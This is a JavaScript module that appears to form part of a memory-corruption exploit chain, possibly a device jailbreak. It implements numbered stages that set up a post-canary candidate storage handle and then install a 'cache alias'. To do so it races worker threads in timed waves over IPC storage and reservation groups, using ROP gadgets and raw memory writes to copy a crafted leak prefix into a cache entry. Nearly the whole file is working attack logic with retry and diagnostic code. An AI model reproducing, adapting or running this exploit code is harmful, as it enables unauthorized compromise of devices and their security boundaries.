import coreRuntime, {waitMs} from "../runtime.mjs";
import {verboseLog, isVerboseLogging} from "../logger.mjs";

const {
  GADGET_MEMSET,
  allocPage,
  call_rop,
  closeReservationGroup,
  executeWave,
  frameArgSlot,
  ipcStorageRead,
  openContentStorage,
  openReservationGroup,
  prepPacket,
  readAllocationCounters,
  resetWaveState,
  roleSendCode,
  write32,
  write64,
  write8,
  writeDirtyData
} = coreRuntime;

function formatRenameInputDiagnostics(diagnostics) {
    if (!diagnostics) return "unavailable";
    var labels = [
        ["src", "fillerSource"], ["dst", "fillerDestination"],
        ["guard0", "guardSource"], ["guard1", "guardDestination"]
    ];
    var summaries = [];
    for (var i = 0; i < labels.length; i++) {
        var label = labels[i][0];
        var name = labels[i][1];
        var before = diagnostics.before?.[name];
        var after = diagnostics.after?.[name];
        if (!before?.available || !after?.available) {
            summaries.push(label + "=unavailable");
            continue;
        }
        var beforeStatus = before.matchesExpected ? "ok" : "diff@" +
            (before.firstDiff ? before.firstDiff.offset : "?");
        var afterStatus = after.matchesExpected ? "ok" : "diff@" +
            (after.firstDiff ? after.firstDiff.offset : "?");
        var status = beforeStatus + ">" + afterStatus +
            (before.hash !== after.hash ? "/mutated" : "");
        summaries.push(label + "/" + before.size + "=0x" +
            before.hash.toString(16) + ">0x" + after.hash.toString(16) +
            "/" + status);
    }
    var descriptorStatus = diagnostics.descriptorsOk ? "ok" : "bad";
    if (!diagnostics.descriptorsOk && diagnostics.descriptors?.roles) {
        var badRoles = diagnostics.descriptors.roles.filter(role =>
            role.descriptors.some(desc => !desc.matchesExpected));
        descriptorStatus += ":" + badRoles.map(role => "W" + role.role + "[" +
            role.descriptors.map((desc, index) => index + ":" +
                desc.index + "/" + desc.size + "@0x" +
                desc.address.toString(16) + "/0x" +
                desc.word0.toString(16) + "/0x" +
                desc.word1.toString(16)).join(",") + "]").join(";");
    }
    return summaries.join(",") + ";xdesc=" + descriptorStatus;
}

function formatCopyWaveDiagnostics(gateFailures, shapeMissing, minMarginUs,
    maxMarginUs, minLowCacheUsed, maxLowCacheUsed, pathReplyFailures) {
    const parts = [];
    const gates = Object.keys(gateFailures || {}).sort((a, b) =>
        gateFailures[b] - gateFailures[a]);
    if (gates.length) {
        const shown = gates.slice(0, 5).map(key =>
            key + "=" + gateFailures[key]);
        if (gates.length > shown.length)
            shown.push("+" + (gates.length - shown.length) + " other gates");
        parts.push("gate rejects: " + shown.join(", "));
    }

    const missing = Object.keys(shapeMissing || {}).sort((a, b) =>
        shapeMissing[b] - shapeMissing[a]);
    if (missing.length) {
        const shown = missing.slice(0, 4).map(role =>
            role + "=" + shapeMissing[role]);
        if (missing.length > shown.length)
            shown.push("+" + (missing.length - shown.length) + " roles");
        parts.push("overlap missing: " + shown.join(", "));
    }

    if (Number.isFinite(minMarginUs) && Number.isFinite(maxMarginUs))
        parts.push("margin=" + minMarginUs.toFixed(0) + ".." +
            maxMarginUs.toFixed(0) + "µs");
    if (Number.isFinite(minLowCacheUsed) && Number.isFinite(maxLowCacheUsed))
        parts.push("low cache hold=0x" + minLowCacheUsed.toString(16) +
            "..0x" + maxLowCacheUsed.toString(16));

    const pathReplies = Object.keys(pathReplyFailures || {}).sort((a, b) =>
        pathReplyFailures[b].count - pathReplyFailures[a].count);
    if (pathReplies.length) {
        const shown = pathReplies.slice(0, 5).map(key => {
            const stats = pathReplyFailures[key];
            const rawExample = stats.rawExample == null
                ? "unknown" : "0x" + stats.rawExample.toString(16);
            return key + "=" + stats.count + " (raw " + rawExample + ")";
        });
        if (pathReplies.length > shown.length)
            shown.push("+" + (pathReplies.length - shown.length) + " other replies");
        parts.push("non-202 path replies: " + shown.join(", "));
    }

    return parts.length ? " · " + parts.join(" · ") : "";
}

// ── Post-canary candidate and cache alias (S13–S14) ─────────────────────────

export async function preparePostCanaryCandidate({
  config,
  helpers,
  canaryQualified,
  pktBuf,
  rootSession,
  storageHandle,
  workerStateSafe,
  usePreReservation = false
}) {
  let candidateHandle = 0;
  let primeHex;
  let failureReason = null;
    // S13: Post-canary — candidate setup + control reads.
    var controlHex = "";
    var aliasControlHex = "";
    primeHex = "";
    var allocCost = null;
    var preGroup = null;

    if (canaryQualified && workerStateSafe) {
        // a) Control read at offset 0 from original storage (full cache block).
        var controlBuf = allocPage(config.CONTROL_SIZE + 0x2000);
        call_rop(GADGET_MEMSET, controlBuf, 0xA5n, BigInt(config.CONTROL_SIZE));
        var controlRead = ipcStorageRead(storageHandle, 0, config.CONTROL_SIZE, controlBuf);
        if (controlRead.error === 0) controlHex = helpers.readHexBytes(controlBuf, 16);

        // b) Alias control at aliasOffset from original storage.
        var aliasBuf = allocPage(0x1000);
        call_rop(GADGET_MEMSET, aliasBuf, 0xA5n, 16n);
        var aliasRead = ipcStorageRead(storageHandle, config.ALIAS_OFFSET, 16, aliasBuf);
        if (aliasRead.error === 0) aliasControlHex = helpers.readHexBytes(aliasBuf, 16);

        var offsetsDistinct = controlHex && aliasControlHex && controlHex !== aliasControlHex;
        if (!offsetsDistinct) {
            failureReason = (!controlHex || !aliasControlHex)
                ? "baseline-control-read-failed"
                : "baseline-offsets-not-distinct";
            canaryQualified = false;
        }
    }

    if (usePreReservation && canaryQualified && workerStateSafe) {
        preGroup = openReservationGroup(rootSession, pktBuf, 59);
        if (!preGroup.ok) {
            failureReason = "pre-reservation-failed";
            canaryQualified = false;
            preGroup = null;
        }
    }

    if (canaryQualified && workerStateSafe) {
        var countersBefore = readAllocationCounters(rootSession, pktBuf);
        var beforeHeap = countersBefore ? countersBefore[5] : null;

        candidateHandle = openContentStorage(rootSession);
        if (!candidateHandle) {
            failureReason = "candidate-storage-open-failed";
        } else {
            var primeBuf = allocPage(0x1000);
            call_rop(GADGET_MEMSET, primeBuf, 0xA5n, 16n);
            var primeRead = ipcStorageRead(candidateHandle, 0, 16, primeBuf);
            if (primeRead.error === 0) primeHex = helpers.readHexBytes(primeBuf, 16);
            var primeMatchesControl = primeHex && primeHex === controlHex;
            if (!primeHex) failureReason = "candidate-prime-read-failed";
            else if (!primeMatchesControl) failureReason = "candidate-prime-mismatch";

            var countersAfter = readAllocationCounters(rootSession, pktBuf);
            var afterHeap = countersAfter ? countersAfter[5] : null;
            allocCost = (beforeHeap !== null && afterHeap !== null)
                ? beforeHeap - afterHeap : null;
        }

        if (!candidateHandle) {
            if (preGroup) closeReservationGroup(preGroup, true, pktBuf);
            preGroup = null;
        } else if (preGroup) {
            if (!Number.isFinite(allocCost) || allocCost < 0) {
                failureReason = failureReason ||
                    "pre-reservation-accounting-unavailable";
                closeReservationGroup(preGroup, true, pktBuf);
                preGroup = null;
            } else {
                preGroup.before[5] -= allocCost;
                preGroup.held[5] -= allocCost;
            }
        }
    }

  if (!workerStateSafe)
      failureReason = "worker-state-unsafe";
  else if (!failureReason && !canaryQualified)
      failureReason = "canary-not-qualified";
  else if (!failureReason && !candidateHandle)
      failureReason = "candidate-storage-open-failed";
  else if (!failureReason && !primeHex)
      failureReason = "candidate-prime-read-failed";

  if (failureReason && preGroup) {
      closeReservationGroup(preGroup, true, pktBuf);
      preGroup = null;
  }

  return {ok: true, canaryQualified, candidateHandle, primeHex,
      aliasControlHex, preGroup, failureReason};
}

export async function installCacheAlias({
  config,
  helpers,
  REQ,
  canaryQualified,
  candidateHandle,
  preGroup = null,
  dirtyFilePath,
  dirtyWriteBuf,
  dirtyWritePkt,
  gates,
  pinPkt,
  pktBuf,
  primeHex,
  rawScheduling,
  rootSession,
  savedHandle,
  sendIndices,
  triggerHandle,
  waveData,
  waveExtra,
  wavesJoined,
  wavesStarted,
  workerResources,
  workerStateSafe,
  fragmentBufs,
  triggerBuf,
  renamePathBuffers = null,
  clearPkt,
  clearSendIndex,
  pinFirstWaveQualified,
  pinHandle,
  pinSendIndex,
  prePkt,
  preSendIndex,
  abortControlCanonical,
  canaryPath,
  setupPath,
  setupPkt,
  reportProgress = null,
  shouldStop = null
}) {
  let aliasInstalled;
  let candidateCacheNeedsRetirement = false;
  let copyStepsCompleted;
  let copyWavesTotal;
  let copyFailureReason;
  let copyStepFailures;
  let copyFailureCounts;
  let stoppedByUser = Boolean(shouldStop?.());
    // S14: Cache alias installation.
    aliasInstalled = false;
    copyWavesTotal = 0;
    copyStepsCompleted = 0;
    copyFailureReason = null;
    copyStepFailures = [];
    copyFailureCounts = Object.create(null);
    var noteCopyFailure = function(reason) {
        copyFailureCounts[reason] = (copyFailureCounts[reason] || 0) + 1;
    };

    if (stoppedByUser) copyFailureReason = "stopped-by-user";
    else if (!canaryQualified) copyFailureReason = "canary-not-qualified";
    else if (!workerStateSafe) copyFailureReason = "worker-state-unsafe";
    else if (!candidateHandle) copyFailureReason = "candidate-storage-unavailable";
    else if (!primeHex) copyFailureReason = "candidate-prime-read-unavailable";

    if (canaryQualified && workerStateSafe && candidateHandle && primeHex &&
        !stoppedByUser) {
        // Combined leak prefix (0x12 = 18 bytes):
        //   aliasOffset LE (8) + 0x4141414141414141 (8) + dirty=1 (1) + NUL (1)
        var leakPrefix = config.CACHE_ALIAS_PREFIX.slice();
        var steps = helpers.nulWrites(leakPrefix);
        if (steps.length !== 7) {
            copyFailureReason = "invalid-copy-plan";
            noteCopyFailure("invalid-copy-plan");
        } else {
            var allStepsOk = true;
            // Treat the cache entry as modified from the first attempted field
            // copy, even if a later timing gate rejects the wave.
            candidateCacheNeedsRetirement = true;

            for (var stepIdx = 0; stepIdx < steps.length &&
                !stoppedByUser && !shouldStop?.(); stepIdx++) {
                var step = steps[stepIdx];
                var stepConfirmed = false;
                var stepAttempts = 0;
                var stepWindowFail = 0;
                var stepPreLow = 0;
                var stepPathMiss = 0;
                var stepGateFailures = Object.create(null);
                var stepShapeMissing = Object.create(null);
                var stepPathReplyFailures = Object.create(null);
                var stepMinMarginUs = null;
                var stepMaxMarginUs = null;
                var stepMinLowCacheUsed = null;
                var stepMaxLowCacheUsed = null;
                var stepHardFailure = null;
                var acceptedResult = null;
                var stepProgressReported = false;
                var stepProgressThreshold = Math.ceil(
                    config.MAX_COPY_ATTEMPTS * config.COPY_BATCHES / 2);

                for (var batch = 0; batch < config.COPY_BATCHES &&
                    !stepConfirmed && !stoppedByUser && !shouldStop?.(); batch++) {
                for (var ca = 0; ca < config.MAX_COPY_ATTEMPTS &&
                    !stoppedByUser && !shouldStop?.(); ca++) {
                    stepAttempts++;

                    if (!writeDirtyData(savedHandle, dirtyFilePath, config.DIRTY_FILE_SIZE,
                            dirtyWriteBuf, dirtyWritePkt)) {
                        stepHardFailure = "dirty-write-failed";
                        noteCopyFailure(stepHardFailure);
                        allStepsOk = false; break;
                    }

                    resetWaveState(waveData.frames, waveData.backups, REQ,
                        waveData.pktBackups, gates, waveExtra);
                    var payloadSetup = helpers.configurePayload(step.bytes, {config, REQ,
                        fragmentBufs: fragmentBufs, triggerBuf: triggerBuf});
                    if (!payloadSetup.configured) {
                        stepHardFailure = "payload-setup-failed";
                        noteCopyFailure(stepHardFailure);
                        allStepsOk = false; break;
                    }

                    var renameInputBefore = renamePathBuffers && isVerboseLogging()
                        ? helpers.captureRenameInputState(REQ,
                            renamePathBuffers, config.workerRoles) : null;

                    var group = preGroup || openReservationGroup(
                        rootSession, pktBuf, 59);
                    if (group === preGroup) preGroup = null;
                    if (!group.ok) {
                        stepHardFailure = "reservation-failed";
                        noteCopyFailure(stepHardFailure);
                        allStepsOk = false; break;
                    }

                    prepPacket(REQ[9], 4, 8, []);
                    write8(REQ[9] + 0x10n, 2n);
                    write32(REQ[9] + 0x14n, BigInt(group.outer));
                    write32(REQ[9] + 0x1Cn, 0n);
                    write64(frameArgSlot(waveData.frames[9].frame,
                        waveData.frames[9].count, sendIndices[9], 0),
                        BigInt(group.session));
                    write64(frameArgSlot(waveData.frames[12].frame,
                        waveData.frames[12].count, sendIndices[12], 0),
                        BigInt(triggerHandle));
                    write32(pinPkt + 0x18n, 1009n);

                    var wave = executeWave(waveData.frames, rawScheduling,
                        workerResources, gates, sendIndices,
                        config.workerRoles);
                    wavesStarted += wave.started === config.WORKER_COUNT
                        ? 1 : 0;

                    if (wave.created < config.WORKER_COUNT ||
                        wave.pinned < config.WORKER_COUNT ||
                        wave.started < config.WORKER_COUNT) {

                        var relCode = roleSendCode(waveData.frames, 9, sendIndices[9]);
                        closeReservationGroup(group,
                            wave.created < config.WORKER_COUNT ||
                                relCode !== 0, pktBuf);

                        if (wave.created === config.WORKER_COUNT &&
                            wave.pinned < config.WORKER_COUNT) {
                            stepHardFailure = "worker-pinning-failed";
                        } else {
                            stepHardFailure = "worker-start-failed";
                        }
                        noteCopyFailure(stepHardFailure);
                        workerStateSafe = wave.workerStateSafe === true;
                        allStepsOk = false; break;
                    }
                    if (wave.joined < config.WORKER_COUNT) {
                        workerStateSafe = false;
                        stepHardFailure = "worker-join-failed";
                        noteCopyFailure(stepHardFailure);
                        allStepsOk = false; break;
                    }
                    wavesJoined++;

                    var wResult = helpers.analyzeWave("cache-" + stepIdx,
                        wave, waveData, group, false, {
                            config, REQ, clearPkt: clearPkt,
                            clearSendIndex: clearSendIndex, gates,
                            pinFirstWaveQualified: pinFirstWaveQualified,
                            pinHandle: pinHandle, pinPkt,
                            pinSendIndex: pinSendIndex, pktBuf,
                            prePkt: prePkt, preSendIndex: preSendIndex,
                            rootSession, sendIndices,
                            abortControlCanonical: abortControlCanonical,
                            canaryPath: canaryPath, savedHandle,
                            setupPath: setupPath, setupPkt: setupPkt,
                            renamePathBuffers, renameInputBefore
                        });

                    var releaseWasSent = roleSendCode(waveData.frames, 9,
                        sendIndices[9]) === 0;
                    closeReservationGroup(group, !releaseWasSent, pktBuf);

                    copyWavesTotal++;

                    if (Number.isFinite(wResult.marginUsRaw)) {
                        stepMinMarginUs = stepMinMarginUs === null
                            ? wResult.marginUsRaw
                            : Math.min(stepMinMarginUs, wResult.marginUsRaw);
                        stepMaxMarginUs = stepMaxMarginUs === null
                            ? wResult.marginUsRaw
                            : Math.max(stepMaxMarginUs, wResult.marginUsRaw);
                    }
                    if (!wResult.window) {
                        var rejectedGates = Array.isArray(wResult.rejections)
                            ? wResult.rejections : [];
                        if (!rejectedGates.length)
                            stepGateFailures["window-unqualified"] =
                                (stepGateFailures["window-unqualified"] || 0) + 1;
                        for (var rg = 0; rg < rejectedGates.length; rg++) {
                            var gateName = rejectedGates[rg];
                            stepGateFailures[gateName] =
                                (stepGateFailures[gateName] || 0) + 1;
                        }
                        if (rejectedGates.indexOf("shape") >= 0) {
                            for (var sm = 0;
                                sm < (wResult.shapeMissing || []).length; sm++) {
                                var missingRole = wResult.shapeMissing[sm];
                                stepShapeMissing[missingRole] =
                                    (stepShapeMissing[missingRole] || 0) + 1;
                            }
                        }
                    }
                    var pathReplies = wResult.pathReplyResults || {};
                    for (var pr = 0; pr < 4; pr++) {
                        var pathRole = ["filler0", "filler1", "guard0",
                            "guard1"][pr];
                        var pathCode = pathReplies[pathRole];
                        if (pathCode == null) continue;
                        var pathRaw = pathCode == null
                            ? null : Number(pathCode) >>> 0;
                        var pathCanonical = pathRaw == null
                            ? null : pathRaw === 0xFFFFFFFF
                                ? pathRaw : pathRaw & 0x3FFFFF;
                        if (pathCanonical === 0x202) continue;
                        var pathFailureKey = pathRole + "/0x" +
                            (pathCanonical == null
                                ? "unknown" : pathCanonical.toString(16));
                        if (!stepPathReplyFailures[pathFailureKey])
                            stepPathReplyFailures[pathFailureKey] = {
                                count: 0, rawExample: pathRaw
                            };
                        stepPathReplyFailures[pathFailureKey].count++;
                    }

                    var accepted = wResult.window &&
                        wResult.preReleaseUsed !== null &&
                        wResult.preReleaseUsed >= config.FIELD_MINIMUM_CACHE_HELD &&
                        wResult.changedPaths.length === 0;
                    if (!accepted) {
                        if (!wResult.window) {
                            stepWindowFail++;
                            noteCopyFailure("window-not-qualified");
                        }
                        else if (wResult.preReleaseUsed === null ||
                                 wResult.preReleaseUsed < config.FIELD_MINIMUM_CACHE_HELD) {
                            stepPreLow++;
                            noteCopyFailure("pre-release-below-minimum");
                            if (Number.isFinite(wResult.preReleaseUsed)) {
                                stepMinLowCacheUsed = stepMinLowCacheUsed === null
                                    ? wResult.preReleaseUsed
                                    : Math.min(stepMinLowCacheUsed,
                                        wResult.preReleaseUsed);
                                stepMaxLowCacheUsed = stepMaxLowCacheUsed === null
                                    ? wResult.preReleaseUsed
                                    : Math.max(stepMaxLowCacheUsed,
                                        wResult.preReleaseUsed);
                            }
                        } else if (wResult.changedPaths.length > 0) {
                            stepPathMiss++;
                            noteCopyFailure("path-mismatch");
                        }
                    }
                    if (reportProgress && accepted) {
                        if (!isVerboseLogging())
                            await reportProgress("Memory alias progress: copy step " +
                                (stepIdx + 1) + "/" + steps.length +
                                " complete after " + copyWavesTotal + " waves.");
                    } else if (reportProgress && !stepProgressReported &&
                        stepAttempts >= stepProgressThreshold) {
                        await reportProgress("Memory alias progress: copy step " +
                            (stepIdx + 1) + "/" + steps.length +
                            " is still searching after " + stepAttempts + "/" +
                            (config.MAX_COPY_ATTEMPTS * config.COPY_BATCHES) +
                            " waves.");
                        await verboseLog("Memory alias diagnostics: copy step " +
                            (stepIdx + 1) + "/" + steps.length + " after " +
                            stepAttempts + " waves" + formatCopyWaveDiagnostics(
                                stepGateFailures, stepShapeMissing,
                                stepMinMarginUs, stepMaxMarginUs,
                                stepMinLowCacheUsed, stepMaxLowCacheUsed,
                                stepPathReplyFailures) +
                            " · rejects: window=" + stepWindowFail +
                            ", cache=" + stepPreLow + ", changed-path=" +
                            stepPathMiss + ".");
                        stepProgressReported = true;
                    }
                    if (accepted) {
                        acceptedResult = wResult;
                        candidateCacheNeedsRetirement = true;
                        stepConfirmed = true;
                    }

                    // Wave execution is synchronous. Yield once so controller
                    // actions and the log scroller can run before the next wave.
                    await waitMs(0);
                    if (shouldStop?.()) {
                        stoppedByUser = true;
                        copyFailureReason = "stopped-by-user";
                    }
                    if (stepConfirmed || stoppedByUser) break;
                }
                }

                if (stoppedByUser && !stepConfirmed) {
                    allStepsOk = false;
                    await verboseLog("Memory alias stopped during step " +
                        (stepIdx + 1) + "/" + steps.length + " after " +
                        stepAttempts + " waves.");
                    break;
                }

                if (!allStepsOk || !stepConfirmed) {
                    var stepFailureReason = stepHardFailure || "";
                    if (!stepFailureReason && stepWindowFail) {
                        stepFailureReason = "window-not-qualified";
                    } else if (!stepFailureReason && stepPreLow) {
                        stepFailureReason = "pre-release-below-minimum";
                    } else if (!stepFailureReason && stepPathMiss) {
                        stepFailureReason = "path-mismatch";
                    } else if (!stepFailureReason) {
                        stepFailureReason = "copy-attempts-exhausted";
                    }

                    if (!stepHardFailure) noteCopyFailure("copy-attempts-exhausted");
                    copyFailureReason = stepFailureReason;
                    copyStepFailures.push({step: stepIdx + 1,
                        attempts: stepAttempts, windowRejects: stepWindowFail,
                        preReleaseRejects: stepPreLow, pathMismatches: stepPathMiss,
                        reason: stepFailureReason});
                    await verboseLog("Memory alias step " +
                        (stepIdx + 1) + "/" + steps.length +
                        " rejected after " + stepAttempts + " waves: window=" +
                        stepWindowFail + ", cache=" + stepPreLow +
                        ", changed-path=" + stepPathMiss +
                        formatCopyWaveDiagnostics(stepGateFailures,
                            stepShapeMissing, stepMinMarginUs, stepMaxMarginUs,
                            stepMinLowCacheUsed, stepMaxLowCacheUsed,
                            stepPathReplyFailures) +
                        ".");
                    allStepsOk = false; break;
                }

                copyStepsCompleted++;
                await verboseLog("Memory alias step " +
                    (stepIdx + 1) + "/" + steps.length + " accepted after " +
                    stepAttempts + " waves" +
                    (acceptedResult?.margin != null
                        ? " · margin=" + acceptedResult.margin + "/300µs" : "") +
                    (acceptedResult?.preReleaseUsed != null
                        ? " · cache=0x" +
                          Number(acceptedResult.preReleaseUsed).toString(16) : "") +
                    ".");
                if (stoppedByUser) {
                    allStepsOk = false;
                    break;
                }
            }

            if (shouldStop?.()) {
                stoppedByUser = true;
                copyFailureReason = "stopped-by-user";
            }
            aliasInstalled = allStepsOk && !stoppedByUser;
        }

    }

  if (preGroup) {
      closeReservationGroup(preGroup, true, pktBuf);
      preGroup = null;
  }

  return {ok: true, aliasInstalled, candidateCacheNeedsRetirement,
      copyStepsCompleted, copyWavesTotal, copyFailureReason,
      copyFailureCounts, copyStepFailures, wavesJoined, wavesStarted,
      workerStateSafe, stoppedByUser};
}
